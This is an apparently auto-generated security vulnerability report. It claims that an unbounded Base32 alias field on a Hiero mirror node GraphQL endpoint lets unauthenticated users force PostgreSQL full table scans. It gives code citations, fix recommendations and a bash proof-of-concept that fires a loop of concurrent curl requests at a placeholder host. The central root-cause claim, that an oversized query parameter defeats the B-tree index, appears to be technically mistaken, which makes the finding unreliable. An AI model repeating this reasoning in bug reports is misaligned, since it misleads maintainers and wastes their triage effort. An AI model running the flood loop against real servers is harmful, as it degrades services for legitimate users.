### Title
Unbounded Base32 Alias Input Bypasses Index, Enabling Unauthenticated DoS via Full Table Scan

### Summary
The GraphQL `account` query accepts an `alias` field validated only by a character-set regex (`^[A-Z2-7]+$`) with no maximum length constraint. An attacker can submit an arbitrarily long valid Base32 string that decodes to a byte array exceeding PostgreSQL's B-tree index key size limit (~2712 bytes), forcing the `findByAlias` native query to fall back to a sequential scan on the `entity` table. Repeated unauthenticated requests saturate database resources and prevent legitimate transaction history queries from completing.

### Finding Description
**Code path:**

1. `account.graphqls` line 90 — the only validation on `alias` is a character-set pattern with no length bound:
   ```
   alias: String @Pattern(regexp: "^[A-Z2-7]+$")
   ``` [1](#0-0) 

2. `GraphQlUtils.java` lines 83–85 — `decodeBase32` performs no length check on input or output:
   ```java
   public static byte[] decodeBase32(String base32) {
       return BASE32.decode(base32);
   }
   ``` [2](#0-1) 

3. `EntityServiceImpl.java` line 30 — decoded bytes are passed directly to the repository:
   ```java
   return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
   ``` [3](#0-2) 

4. `EntityRepository.java` lines 13–14 — native query issues an equality comparison against the full byte array:
   ```java
   @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
   Optional<Entity> findByAlias(byte[] alias);
   ``` [4](#0-3) 

5. The `entity__alias` index is a standard B-tree partial index:
   ```sql
   create index if not exists entity__alias on entity (alias) where alias is not null;
   ``` [5](#0-4) 

**Root cause:** PostgreSQL B-tree indexes have a hard maximum key size of approximately 2712 bytes (for the default 8 KB page size). When the query parameter `?1` is a `bytea` value exceeding this limit, PostgreSQL cannot use the `entity__alias` index and falls back to a sequential scan of the entire `entity` table. Base32 encodes 5 bytes per 8 characters, so a string of ~4340 valid `[A-Z2-7]` characters decodes to >2712 bytes — well within what the unbounded `@Pattern` allows.

**Why existing checks fail:** The `@Pattern(regexp: "^[A-Z2-7]+$")` annotation enforces only the Base32 alphabet. There is no `@Size(max=...)`, no length guard in `decodeBase32`, and no length guard in `getByAliasAndType`. The `evmAddress` field is implicitly bounded to 40 hex chars by its regex, but `alias` has no equivalent upper bound.

### Impact Explanation
Every sequential scan on a large `entity` table consumes significant CPU and I/O on the database server. Because the GraphQL endpoint is publicly accessible with no authentication, an attacker can flood the service with alias-lookup requests carrying oversized payloads. This exhausts the database connection pool and query executor threads, causing legitimate transaction history queries — which depend on the same `entity` table — to time out or queue indefinitely. The impact is a sustained, targeted DoS against the mirror node's read path.

### Likelihood Explanation
No authentication or API key is required to reach the GraphQL `account` query. The attack requires only knowledge of the public GraphQL schema (which is introspectable by default) and the ability to send HTTP POST requests. The payload is trivially constructed: a string of repeated `A` characters of length ≥ 4340. The attack is fully repeatable and scriptable, and a single attacker with modest bandwidth can sustain it indefinitely.

### Recommendation
Add a maximum length constraint on the `alias` input field. Legitimate Hedera account aliases are derived from Ed25519 or ECDSA secp256k1 public keys, which produce at most 35 bytes (ECDSA with proto prefix) — 56 Base32 characters without padding. A safe upper bound is 64 characters:

```graphql
alias: String @Pattern(regexp: "^[A-Z2-7]+$") @Size(max: 64)
```

Additionally, add a defensive length check in `decodeBase32` or `getByAliasAndType`:

```java
if (alias.length() > 64) {
    throw new IllegalArgumentException("Alias exceeds maximum length");
}
```

This ensures the decoded byte array never exceeds ~40 bytes, well within the B-tree index key size limit, and the index is always used.

### Proof of Concept
```bash
# Construct a valid Base32 string of 5000 characters (decodes to 3125 bytes, exceeds PG B-tree limit)
ALIAS=$(python3 -c "print('A' * 5000)")

# Send to the public GraphQL endpoint (no auth required)
curl -s -X POST http://<mirror-node-host>:8083/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d "{\"query\": \"{ account(input: {alias: \\\"$ALIAS\\\"}) { id } }\"}"

# Repeat in a loop to exhaust DB resources
for i in $(seq 1 100); do
  curl -s -X POST http://<mirror-node-host>:8083/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"{ account(input: {alias: \\\"$ALIAS\\\"}) { id } }\"}" &
done
wait
```

Expected result: each request triggers a sequential scan on the `entity` table (verifiable via `pg_stat_activity` or `EXPLAIN ANALYZE`). Under concurrent load, legitimate queries against the same table experience severe latency or timeout.

### Citations

**File:** graphql/src/main/resources/graphql/account.graphqls (L89-90)
```text
    "A RFC 4648 Base32, with the trailing '=' characters removed, string that represents an account alias."
    alias: String @Pattern(regexp: "^[A-Z2-7]+$")
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/util/GraphQlUtils.java (L83-85)
```java
    public static byte[] decodeBase32(String base32) {
        return BASE32.decode(base32);
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java (L29-31)
```java
    public Optional<Entity> getByAliasAndType(String alias, EntityType type) {
        return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java (L13-14)
```java
    @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
    Optional<Entity> findByAlias(byte[] alias);
```

**File:** importer/src/main/resources/db/migration/v1/V1.50.3__account_alias.sql (L12-14)
```sql
-- support retrieval by alias
create index if not exists entity__alias
    on entity (alias) where alias is not null;
```
